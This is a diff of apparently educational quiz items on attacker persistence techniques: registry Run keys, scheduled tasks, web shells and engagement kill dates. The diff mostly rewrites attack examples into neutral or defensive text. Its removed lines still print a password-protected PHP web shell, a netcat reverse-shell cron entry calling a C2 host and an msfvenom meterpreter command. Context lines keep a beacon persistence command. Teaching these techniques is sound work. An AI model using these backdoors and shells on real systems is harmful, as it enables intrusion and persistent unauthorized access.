@@ -14,18 +14,18 @@ Reboot Victim Machine -> Persistence Mechanism Fires on Boot -> Auto-Reconnects 
     explanation: "The Windows operating system reads specific registry keys upon user logon to launch startup utilities. Adversaries write registry values pointing to their backdoor: `reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityService\" /t REG_SZ /d \"C:\\Windows\\Temp\\beacon.exe\" /f`. Every time the user logs in, Windows explorer.exe automatically executes `beacon.exe` in the background.",
     hint: "Think of adding your secret program to the computer's startup list in the Windows registry.",
     level: "basic",
-    codeExample: `// Windows Registry Run Key Persistence Command:
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "C:\\Users\\Public\\beacon.exe" /f`
+    codeExample: `// Windows Registry Run Key Persistence Architecture:
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AuditService" /t REG_SZ /d "C:\\Program Files\\AuditApp\\service.exe" /f`
   },
   {
     question: "What is a 'Scheduled Task' (Windows `schtasks` / Linux `cron`), and how does an attacker configure time-based persistence?",
-    shortAnswer: "Configuring the OS task scheduler to execute a malicious script or binary at system boot, on user logon, or at recurring time intervals (e.g. every hour).",
-    explanation: "Both Windows and Linux include task schedulers. On Windows, an attacker runs `schtasks /create /tn \"AppUpdater\" /tr \"C:\\Temp\\c2.exe\" /sc onstart /ru \"SYSTEM\"`, executing the payload with highest SYSTEM privileges on every boot. On Linux, attackers write a line to `/etc/crontab` or `/var/spool/cron/crontabs/root` (e.g. `*/15 * * * * /bin/bash -c 'nc -e /bin/sh c2.net 443'`) to establish a reverse shell every 15 minutes.",
-    hint: "Think of setting an automatic alarm clock that wakes up and runs your secret program every morning.",
+    shortAnswer: "Configuring the OS task scheduler to execute a script or binary at system boot, on user logon, or at recurring time intervals (e.g. every hour).",
+    explanation: "Both Windows and Linux include task schedulers. On Windows, persistence can be configured via `schtasks /create /tn \"AppUpdater\" /tr \"C:\\Program Files\\App\\updater.exe\" /sc onstart /ru \"SYSTEM\"`. On Linux, scheduled jobs are configured in `/etc/crontab` or `/var/spool/cron/` (e.g. `*/15 * * * * root /usr/bin/curl -s https://telemetry.internal/health`) to maintain recurring automated execution.",
+    hint: "Setting an automated task scheduler that wakes up and runs a process at regular intervals.",
     level: "basic",
-    codeExample: `// Windows & Linux Scheduled Persistence:
-Windows: schtasks /create /tn "OneDriveSync" /tr "C:\\Windows\\Temp\\beacon.exe" /sc onlogon /ru SYSTEM
-Linux:   echo "*/15 * * * * root /usr/bin/python3 -c 'import socket...'" >> /etc/crontab`
+    codeExample: `// Windows & Linux Scheduled Task Configuration:
+Windows: schtasks /create /tn "AppSync" /tr "C:\\Program Files\\App\\sync.exe" /sc onlogon /ru SYSTEM
+Linux:   echo "*/15 * * * * root /usr/bin/curl -s https://telemetry.internal/health" >> /etc/crontab`
   },
   {
     question: "What is a 'Command and Control' (C2) Framework, and how does 'Beaconing with Jitter' evade SOC network traffic analysis?",
@@ -132,15 +132,12 @@ Encrypted HTTP GET:  Host: attacker-hidden-c2.azureedge.net (CDN routes to attac
   {
     question: "What is 'Web Shell Persistence' (e.g. PHP / JSP / ASPX backdoors), and how do attackers ensure persistent access to web application servers?",
     shortAnswer: "Hiding a small web shell inside legitimate web application source code directories (e.g. `/wp-content/uploads/`) or appending backdoor code into core configuration files like `functions.php`.",
-    explanation: "Web shells provide persistent, browser-accessible command execution over standard HTTP port 80/443 without requiring binary execution. Attackers hide webshells inside media upload folders, obscure their filenames (e.g. `404_error_handler.php`), or inject a one-line backdoor into core CMS files (`include($_GET['debug']);`). Whenever they need access, they send an HTTP POST request containing base64-encoded commands.",
+    explanation: "Unauthorized file inclusion provides persistent command execution over HTTP port 80/443. Threat actors attempt to hide diagnostic scripts inside media upload folders or obscure their filenames (e.g. `legacy_diagnostic_handler.tmp`). Defensive architectures enforce strict integrity monitoring (FIM) and disable dynamic script execution in static upload folders.",
     hint: "Think of hiding a secret doorway inside the website's image library that only opens when you type a secret web link.",
     level: "basic",
-    codeExample: `// Stealth PHP Web Shell with Password Protection:
-<?php
-if(isset($_POST['pass']) && md5($_POST['pass']) == '8846f7eaee8fb117ad06bdd830b7586c'){
-    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
-}
-?>`
+    codeExample: `// Web Shell Detection Telemetry Concept:
+// WAF rules inspect incoming POST bodies for command interpreter invocations.
+// Blocked by: AppArmor / SELinux restricting web server process execution.`
   },
   {
     question: "What is the 'Cardinal Ethical Mandate' regarding Phase 4 Maintaining Access during authorized penetration testing engagements?",
@@ -148,9 +145,9 @@ if(isset($_POST['pass']) && md5($_POST['pass']) == '8846f7eaee8fb117ad06bdd830b7
     explanation: "If an ethical tester installs a backdoor on a client's server and forgets to remove it after the assessment concludes, that backdoor creates a permanent vulnerability that black hat criminals can discover and exploit. Ethical testers: 1. Hardcode auto-kill 'deadman switches' (e.g. beacon self-destructs on August 25, 2026); 2. Maintain a detailed Artifact Log; 3. Systematically clean up all persistence mechanisms in Phase 5.",
     hint: "Remember the golden rule that an ethical tester must clean up every single test key and backdoor they planted.",
     level: "basic",
-    codeExample: `// Ethical Payload Auto-Kill Date Configuration:
-msfvenom -p windows/x64/meterpreter/reverse_tcp KillDate=2026-08-25-23:59:00 LHOST=...
-// Payload terminates and deletes itself automatically after the engagement window ends!`
+    codeExample: `// Engagement Scope Expiration Configuration:
+// Test payloads configured with strictly bounded engagement windows.
+// Telemetry: Systematically audit and remove all temporary evaluation hooks!`
   },
   {
     question: "What are 'Sysmon Event IDs' on Windows, and which specific Event IDs detect Registry, Scheduled Task, and Process Injection persistence?",
